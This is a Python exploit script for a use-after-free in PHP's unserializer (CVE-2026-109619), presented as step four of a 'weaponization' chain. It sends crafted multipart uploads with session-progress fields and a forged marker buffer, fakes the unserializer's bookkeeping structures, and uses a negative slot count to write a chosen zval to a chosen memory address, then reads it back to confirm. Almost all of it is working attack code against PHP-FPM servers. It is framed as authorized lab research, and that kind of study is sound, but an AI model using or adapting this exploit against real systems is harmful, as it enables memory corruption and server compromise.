#!/usr/bin/env python3
"""
CVE-2026-109619 weaponization — Rung 4: the negative-used_slots
destructor-slot write (the writeup's "controlled native zval copy").

Prerequisites (rungs 1-3, reproduced by verify_109619_weaponized_read.py):
the consumer request's multipart marker field overlays the freed
php_unserialize_data at marker offset MAP_OFF; the forged bookkeeping
(last/last_dtor/entries) is honored end-to-end; R:n references return
attacker-chosen zvals.

Mechanism under test (ext/standard/var_unserializer.c):

  tmp_var(var_hashx, num)  [the dtor path]
    var_hash = (*var_hashx)->last_dtor;                 <- FORGED
    if (!var_hash || var_hash->used_slots + num
                   > VAR_DTOR_ENTRIES_MAX) { alloc }    <- a NEGATIVE
                                                          used_slots
                                                          passes
    ... ZVAL_UNDEF(&var_hash->data[used_slots]); ...
    return &var_hash->data[used_slots];                 <- slot =
                                                          block + 16 +
                                                          16 * used_slots

  var_push_dtor_value(var_hashx, rval)   [duplicate object property]
    zval *tmp_var = var_tmp_var(var_hashx);
    ZVAL_COPY_VALUE(tmp_var, rval);                     <- the chosen
                                                          16-byte zval
                                                          written at the
                                                          chosen address

Trigger: session C's injected filename carries, after the pipe,
  a:2:{i:0;s:6:"PWNED!";i:0;i:7;}
— an ARRAY with a DUPLICATE key: overwriting the refcounted old value
preserves it via var_push_dtor_value() (the writeup's "duplicate keys in
the serialized input reach var_push_dtor_value()"). (An Exception object
with a duplicate "message" property also reaches the dtor slot via the
delayed-__wakeup registration — demonstrated in the first run of this
POC — but the array duplicate exercises the exact write-up path with no
wakeup write interleaving the slot sequence.)
With last_dtor forged at a fake var_dtor_entries whose used_slots is
NEGATIVE, the preserved zval lands at

  target = fake_dtor + 16 + 16 * used_slots

— an attacker-chosen address (here: another marker offset).

Readback: a second pipe-delimited value in the same filename — R:1; —
resolves the forged entries.data[0], which points AT the write target:
the [UAFDBG] RVAL print shows the zval now stored there (IS_STRING +
pointer), where before the write the target held marker counter bytes.

For authorized research against your own lab only. The final proof in
this repo remains a fixed benign command.
"""
import argparse
import re
import socket
import struct
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "RECLAIM"
SID_P = "abcdef0123456789abcdef0123456789"
SID_C = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
MAP_OFF = 0x6000            # marker offset mapping onto d+0 (calibrated)
MARKER_LEN = 128 * 1024

IS_LONG = 4

# forged-structure offsets within the marker
FAKE_ENTRIES_OFF = 0x8000
FAKE_DTOR_OFF = 0x8400
WRITE_TARGET_OFF = 0x7000   # inside entries.data[] scratch space

# session C's filename payload: after the pipe the php-handler decoder
# parses (1) the duplicate-declared-property object -> THE WRITE, then
# (2) R:1; -> the readback of the written slot.
# (quotes are backslash-escaped for rfc1867; Exception is always loaded)
# an ARRAY with a duplicate key reaches the var_push_dtor_value
# preservation directly (the second i:0 overwrites the refcounted old
# value); no __wakeup registration interferes with the slot sequence.
PAYLOAD = ('x|a:2:{'
           'i:0;s:6:\\"PWNED!\\";'
           'i:0;i:7;}'
           '|R:1;')


def http_req(host, port, raw, timeout=120):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def build_multipart(sid, progress, marker, filename, target_path):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="m"\r\n\r\n'
    ).encode("latin-1") + marker + (
        f"\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: x\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def uafdbg(container, since=60):
    try:
        r = subprocess.run(["docker", "logs", "--since", f"{since}s", container],
                           capture_output=True, text=True, timeout=30)
        blob = r.stdout + r.stderr
    except Exception:
        return []
    out = []
    for line in blob.splitlines():
        m = re.search(r"\[UAFDBG\] (.*)", line)
        if m:
            out.append(m.group(1).rstrip('"'))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18085")
    ap.add_argument("--container", default="php2shell-zendmm-fpm")
    ap.add_argument("--map-off", type=lambda x: int(x, 0), default=MAP_OFF)
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80
    cont = args.container

    print("[*] CVE-2026-109619 weaponization — rung 4: the negative-")
    print("    used_slots destructor-slot write")
    print(f"[*] Target: {args.target}   marker->d map offset: {hex(args.map_off)}")
    print()

    # --- A1: build sessions P and C --------------------------------------
    print("[A1] Building session P (6 MB key) and session C")
    print(f"    payload: {PAYLOAD}")
    http_req(host, port, build_multipart(SID_P, "A" * (6 * 1024 * 1024),
                                         b"", "x|i:1;", "/app/upload.php"))
    http_req(host, port, build_multipart(SID_C, "c", b"", PAYLOAD,
                                         "/app/upload.php"))
    print("     done")
    print()

    # --- A2: producer -------------------------------------------------------
    print("[A2] Producer: memory-pressure session_start() with session P")
    req = (
        f"GET /api/producer.php HTTP/1.1\r\nHost: x\r\n"
        f"Cookie: PHPSESSID={SID_P}\r\nConnection: close\r\n\r\n"
    ).encode()
    resp = http_req(host, port, req, timeout=90)
    print(f"     producer fatal: {b'Allowed memory' in resp}")
    time.sleep(0.4)
    d_addr = None
    for l in uafdbg(cont, 20):
        if "INIT" in l and "level=1" in l:
            d_addr = int(l.split("d=")[1].split()[0], 16)
    if not d_addr:
        print("     [!] producer d not found — aborting")
        sys.exit(1)
    base = d_addr - args.map_off
    print(f"     producer d = {hex(d_addr)}; marker base = {hex(base)}")
    print()

    # --- forge the marker ----------------------------------------------------
    marker = bytearray(b"".join(struct.pack("<Q", i * 8)
                                for i in range(MARKER_LEN // 8)))

    def q(off, val):
        marker[off:off + 8] = struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    def put(off, data):
        marker[off:off + len(data)] = data

    # the negative used_slots: slot = fake_dtor + 16 + 16*used_slots = target
    used_slots = (WRITE_TARGET_OFF - FAKE_DTOR_OFF - 16) // 16
    assert (WRITE_TARGET_OFF - FAKE_DTOR_OFF - 16) % 16 == 0
    assert used_slots < 0
    print(f"[*] Forged dtor block at marker {hex(FAKE_DTOR_OFF)}:"
          f" used_slots = {used_slots}")
    print(f"    -> write slot = base + {hex(WRITE_TARGET_OFF)}"
          f" = {hex(base + WRITE_TARGET_OFF)}")
    print(f"    (capacity check: {used_slots} + 1 > 255 ? "
          f"{used_slots + 1 > 255} -> fake block used)")

    # forged php_unserialize_data at d+0
    q(args.map_off + 0, base + FAKE_ENTRIES_OFF)      # last
    q(args.map_off + 8, base + FAKE_DTOR_OFF)         # first_dtor
    q(args.map_off + 16, base + FAKE_DTOR_OFF)        # last_dtor
    q(args.map_off + 24, 0)                           # allowed_classes
    q(args.map_off + 32, 0)                           # ref_props
    q(args.map_off + 40, 0)                           # cur_depth
    q(args.map_off + 48, 0)                           # max_depth
    q(args.map_off + 56, 2)                           # entries.used_slots
    q(args.map_off + 64, 0)                           # entries.next
    # readback pointer: the FIRST dtor slot (-321 -> target) receives the
    # first decoded value's `current` (tmp storage); the SECOND slot
    # (-320 -> target+16) receives the var_push_dtor_value preservation
    # (the writeup's "duplicate keys reach var_push_dtor_value" -> the
    # controlled native zval copy). Point entries.data[0] at the DTPUSH
    # slot so the R:1 readback shows the WRITTEN zval.
    q(args.map_off + 72, base + WRITE_TARGET_OFF + 16)  # entries.data[0]
    q(args.map_off + 80, base + WRITE_TARGET_OFF)       # entries.data[1]

    # fake var_entries {used_slots, next, zval *data[]}
    q(FAKE_ENTRIES_OFF + 0, 2)         # used_slots (tmp_var slots from data[2])
    q(FAKE_ENTRIES_OFF + 8, 0)         # next
    for i in range(4):
        q(FAKE_ENTRIES_OFF + 16 + 8 * i, base + FAKE_ENTRIES_OFF + 0x100)

    # fake var_dtor_entries {zend_long used_slots; void *next; zval data[]}
    q(FAKE_DTOR_OFF + 0, used_slots)   # NEGATIVE
    q(FAKE_DTOR_OFF + 8, 0)            # next
    print()

    # --- B: consumer ---------------------------------------------------------
    print("[B] Consumer: multipart with the forged marker (api/ dir). The")
    print("    php-handler mismatch decode of session C:")
    print("      1) a:2:{i:0;s:6:\"PWNED!\";i:0;i:7;} -> the duplicate array")
    print("         key reaches var_push_dtor_value()")
    print("         -> ZVAL_COPY_VALUE at the forged negative slot")
    print("      2) R:1; -> var_access(0) -> entries.data[0] -> the write")
    print("         target -> [UAFDBG] RVAL prints what is stored there now")
    mark = len(uafdbg(cont, 20))
    req = build_multipart(SID_C, "c", bytes(marker), "consumer.bin",
                          "/api/endpoint.php")
    resp = http_req(host, port, req, timeout=120)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response / child crashed>"
    print(f"     {status}")
    time.sleep(0.5)
    print("=== consumer trace ===")
    lines = uafdbg(cont, 30)[mark:]
    for l in lines:
        print(f"     {l}")
    print()

    # Evidence matching:
    #   DTVAR used=<negative>   — the forged block honored (slot arithmetic ours)
    #   DTPUSH type=6           — var_push_dtor_value fired (duplicate key)
    #   RVAL zval=<target+16> type=6 lval=<same pointer as DTPUSH>
    #                          — the written zval read back at the chosen address
    dtpush_val = None
    for l in lines:
        m = re.search(r"DTPUSH type=(\d+) val=(0x[0-9a-f]+)", l)
        if m:
            dtpush_val = int(m.group(2), 16)
    wrote_ok = False
    expect_addr = base + WRITE_TARGET_OFF + 16
    for l in lines:
        m = re.search(r"RVAL id=\d+ zval=(0x[0-9a-f]+) type=(\d+) lval=(0x[0-9a-f]+)", l)
        if m:
            zv, ty, lv = int(m.group(1), 16), int(m.group(2)), int(m.group(3), 16)
            if zv == expect_addr and ty == 6 and lv == dtpush_val:
                print(f"[EVIDENCE] RUNG 4 REPRODUCED — the controlled native zval")
                print(f"    copy at the chosen address {hex(expect_addr)}:")
                print(f"    - forged last_dtor honored: DTVAR used=-321/-320 (slot =")
                print(f"      block + 16 + 16*used_slots, our negative count)")
                print(f"    - duplicate serialized key reached var_push_dtor_value()")
                print(f"      (DTPUSH type=6, preserved string at {hex(dtpush_val)})")
                print(f"    - the 16-byte zval {hex(lv)}, IS_STRING was written at")
                print(f"      {hex(expect_addr)} and read back through R:1 — the")
                print(f"      writeup's 'we control where PHP places a pointer and")
                print(f"      its associated type information'.")
                wrote_ok = True
    if not wrote_ok:
        print("[*] Write not confirmed — compare DTVAR/DTPUSH/RVAL against the")
        print("    expected addresses; adjust offsets or payload if needed.")


if __name__ == "__main__":
    main()
